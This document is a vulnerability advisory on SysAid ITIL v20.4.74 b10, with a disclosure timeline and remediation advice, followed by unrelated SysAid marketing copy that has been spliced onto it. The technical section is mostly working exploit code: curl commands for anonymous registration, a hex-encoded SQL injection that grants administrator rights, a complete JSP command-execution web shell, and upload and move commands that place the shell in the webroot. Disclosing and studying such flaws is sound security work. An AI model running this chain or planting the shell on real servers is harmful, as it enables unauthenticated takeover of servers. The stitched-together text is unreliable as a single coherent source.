# SysAid ITIL Multiple Vulnerabilities

## Vendors

* SysAid

## Affected Products

* ITIL v20.4.74 b10

## Summary

Multiple issues were found in SysAid ITIL that ultimately allow an unauthenticated attacker to gain remote code execution on the affected server. First, an attacker can register a user anonymously regardless of the registration feature flag being enabled or disabled. Once authenticated, a SQL injection vulnerability allows the new user to escalate their privileges to `administrator`. Once the user is an `administrator`, the attacker can upload a JSP file and copy it to the webroot, enabling remote code execution.

## Remediation/Mitigation

If running an on-premises SysAid ITIL system, updating to the latest version will resolve the issues described below. At the time of this writing, the latest version for on-premises customers is 21.2.35.

Additional details from SysAid are available here: <https://www.sysaid.com/product/on-premises/latest-release>

## Credit

This issue was found by Brandon Perry of Atredis Partners

## Report Timeline

* 2021-09-21: SysAid was notified, but the original emails and Proof-of-Concept (PoC) were blocked unbeknownst to both parties.
* 2021-10-05: SysAid confirmed receipt of the original PoC.
* 2021-11-17: CVE IDs were allocated and communicated to SysAid.
* 2021-12-22: SysAid confirmed and resolved issues.
* 2022-01-05: Atredis Partners published this advisory.

## Technical Details

### Create User

The `/enduserreg` endpoint, used to register end users anonymously, does not respect the server-side setting of whether to allow users to register. The server-side setting only hides the client-side registration form, but an attacker can still post registration data to the endpoint regardless of the server setting.

This endpoint requires that the outgoing email be configured. The user will be sent an email with the user's new password.

```
id=`curl $1/Login.jsp | ggrep -Eho 'accountid=(.*?)"' | cut -d '"' -f1 | cut -d '=' -f2`

curl -X POST --data "accountID="$id"&X_TOKEN_"$id"=%24tokenValue&thanksForm=thankyou.htm&X_TOKEN_"$id"_trial=%24tokenValue&email=$2&firstName=fdsa&lastName=fdsa&sms=&phone=&mobile=&Save=" $1/enduserreg

```

### SQL Injection

The following SQL injection attack will escalate the newly created user's permissions to an `administrator`. Once updated, the user will need to login again.

```
# Issue is in the getMobileList method in SysAidUser.java
#
#
# public static String getMobileList(LoginInformationBean paramLoginInformationBean, String paramString1, String paramString2, boolean paramBoolean) {
#    StringBuffer stringBuffer = new StringBuffer();
#    int j = 100;
#    if (paramLoginInformationBean.getMobiletype() == b.d) {
#      j = b.i;
#    } else if (paramLoginInformationBean.getMobiletype() == b.f) {
#      j = b.k;
#    } else if (paramLoginInformationBean.getMobiletype() == b.g) {
#      j = b.l;
#    } else if (paramLoginInformationBean.getMobiletype() == b.e) {
#      j = b.j;
#    }
#    Connection connection = null;
#    PreparedStatement preparedStatement = null;
#    ResultSet resultSet = null;
#    try {
#      connection = DBConnection.getInstance().getConn(paramLoginInformationBean.getAccountID());
#      String str1 = " ";
#      String str2 = "order by lower(calculated_user_name)";
#      if (paramString2 != null && paramString2.length() > 0) {
#        paramString2 = paramString2.toLowerCase();
#        str1 = " and lower(calculated_user_name) like '%" + paramString2 + "%' ";
#      }
#
# Just above you can see paramString2 is used unsafely in the SQL query
#
curl -H "Cookie: JSESSIONID=$sess" http://192.168.1.113:8080/mobile/SelectUsers.jsp?filterText=1%27%3b%55%50%44%41%54%45%20%73%79%73%61%69%64%5f%75%73%65%72%20%53%45%54%20%61%64%6d%69%6e%69%73%74%72%61%74%6f%72%3d%43%48%41%52%28%38%39%29%2c%6d%61%69%6e%5f%75%73%65%72%3d%43%48%41%52%28%38%39%29%20%57%48%45%52%45%20%75%73%65%72%5f%6e%61%6d%65%3d%27$2%27--
```

### Arbitrary File Upload

The file used in the commands below for the remote shell is `cmd.jsp`, shown below.

```
<%@ page import="java.util.*,java.io.*"%>
<%
%>
<%
if (request.getParameter("cmd") != null) {
    out.println("Command: " + request.getParameter("cmd") + "<BR>");

    Process p;
    if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
        p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
    }
    else{
        p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    }
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
    out.println(disr);
    disr = dis.readLine();
    }
}
%>

```

The `UploadPsIcon.jsp` page will allow an arbitrary upload and return the absolute server-side path of the file that we parse out of the response.

```
path=`curl -H "Referer: $1/UploadPsIcon.jsp?parent=UserSelfServiceSettings.jsp?uploadPsFile=true" -H "Cookie: JSESSIONID=$sess" -F "file1=@cmd.jsp" -F "X_TOKEN_$id=$token" "$1/UploadPsIcon.jsp?uploadPSFile=false&parent=UserSelfServiceSettings.jsp?uploadPsFile=true" 2>&1 | grep tempFile.value | cut -d '"' -f2`

echo $path
```

### Arbitrary File Read/Copy

Finally, the absolute path from the previous response is taken and a server-side move is performed using the `UserSelfServiceSettings.jsp` page which moves the uploaded JSP file to the webroot. Once moved, the JSP shell cannot be requested with a cookie. There must be no cookies in the request.

```
curl -X POST  -H "Referer: $1/UserSelfServiceSettings.jsp" -H "Cookie: JSESSIONID=$sess" --data "tabID=22&resetPasswordMethod=user&numberOfInvalidAttempts=5&blockUserMinutes=30&dummycaptcha=on&captcha=Y&enableGuest=N&userEmailAsIdentifier=N&PsImageUrl=&sendRandomCodeBySms=N&numberOfSecurityQuestions=2&answerMinimumLength=3&Apply=&OK=&Cancel=&Addtokb=&subAction=&reopenNote=&pageID=1&subPageID=1&replacePage=Y&changes=0&X_TOKEN_$id=$token&showAddFailMsgPopup=&paneMessage=&paneType=&paneBtnArrayButtons=&panePreSubmitFunc=&paneSubmitParentForm=&paneCancelFunc=hideOptionPane&tempFile=$path&fileName=cmd.jsp&psImageChange=true&id=" $1/UserSelfServiceSettings.jsp?uploadPsFile=true
```

## Incident Management

Log, process, manage, and report on the IT issues that adversely affect your end users, IT services, and business services.

Help your service desk agents to achieve what ITIL defines as the objectives of incident management:

* Ensuring that standardized methods are used for the efficient response, analysis, documentation, ongoing management, and reporting of incidents.
* Increasing the visibility and communication of incidents to both business and IT support staff.
* Enhancing the business perception of IT and its services through a professional approach to quickly resolving and communicating incidents when they occur.
* Aligning incident management activities and priorities with those of the parent business.
* Maintaining end-user satisfaction with the quality of IT services.
   Through an incident management process that includes:
* Incident detection and recording
* Initial classification and support
* Escalation to a major incident process where needed
* Invocation of the service request process if not an incident
* Investigation and diagnosis
* Resolution and recovery
* Incident closure
* Continuous ownership, monitoring, tracking, and communication
   If ITIL’s incident management best practice isn’t right for you, then you can easily configure the out-of-the-box incident management process with SysAid – tailored to your exact needs and operational processes.

![SysAid's Incident Management](data:image/svg+xml;nitro-empty-id=NzQzOjQ5Nw==-1;base64...)

**More Than Just Incident Management Software – It’s Also Service Request Management**

While IT support is often viewed as the management of incidents using ticketing software, service desk agents also need to efficiently fulfil end-user requests for new products or services. SysAid’s service request management capabilities, also known as service request fulfillment by ITIL, help you to better manage these requests and improve the service experience to end users. SysAid is so much more than just traditional help desk, ticketing, or incident management software.

* You can use SysAid’s service request management capabilities to help your service desk agents to achieve what ITIL defines as the objectives of service request fulfillment:
* Maintaining end-user and customer satisfaction through the efficient and professional handling of all service requests.
* Providing a channel, or channels, for users to request and receive standard services.
* Providing information to end users and customers about the availability of services and how to obtain them.
* Sourcing and delivering the requested standard services.
* Assisting with general information, complaints, or comments
   Again, if ITIL’s service request management best practice isn’t right for you, then you can easily configure the out-of-the-box service request management process with SysAid – tailored to your organization’s exact needs.

## Self-service Portal

SysAid’s [self-service portal](https://www.sysaid.com/it-service-management-software/self-service-portal) lets end users submit incidents, request services, view IT announcements, chat with IT support people, consult the knowledge articles for self-help, reset domain passwords or unlock accounts, and more.

## Knowledge Management

SysAid [Knowledge Management](https://www.sysaid.com/it-service-management-software/knowledge-management) is an integrated knowledge management module for making incident resolution tips and how-to solutions available to all. Service desk agents and other resolution groups can capture, develop, share, and effectively use knowledge relating to solutions to IT issues and also provide end users with relevant self-help information as needed (via the self-service portal).

## Live Chat

SysAid Chat provides service desk agents, other IT team members, and end users with a real-time chat communication channel to quickly address issues and meet help requests as they arise.

## Mobile Solution

Create, view, add notes, see history, and even add attachments across all active incidents and requests – directly from your mobile device – with [SysAid’s mobile solution](https://www.sysaid.com/it-service-management-software/mobile-solution).

## Remote Control

SysAid’s built-in [remote control capabilities](https://www.sysaid.com/help-desk-software/remote-control) allow service desk agents and other IT support personnel to connect to end-user active sessions, or unattended computers, to give remote assistance.

## **Frequently Asked Questions**

      Toggle accordion item
## **What Is An ITIL Incident Management Software?**

First, you need to understand what is Incident Management Software. To put it simply, this type of software allows you to log, process, manage and report on IT issues. All issues that are logged in are treated as ‘incidents’ in which IT staff can go in, resolve, and manage all logged incidents.

Once you align your Incident Management Software with ITIL, this means that your software should help your IT service desk agents achieve the ITIL incident management objectives. Beyond just logging incidents, your Incident Management Software should help you ensure standardized methods are used for responses, increase visibility of incidents, maintain end-user satisfaction, and more, as part of ITIL objectives.

       Toggle accordion item
## **How Does SysAid’s Request Management Software Work?**

Within our incident management software, we also offer service request management as part of managing incidents and fulfilling end-user requests for new products or services. Our request management software is also aligned with ITIL, taking the traditional structure of incident management software above and beyond, exceeding all expectations.

For example, with our request management software, you can provide information to end users and customers about the availability of services, provide a channel for users to request and receive standard services, assist with comments, complaints and so much more.

       Toggle accordion item
## **What Are Other Features Of SysAid’s Incident Management Software?**

Beyond offering request management software, we also offer self-service portals, knowledge management modules, a live chat, remote control capabilities, password resets and a mobile solution for viewing and adding notes across all active incidents and requests.
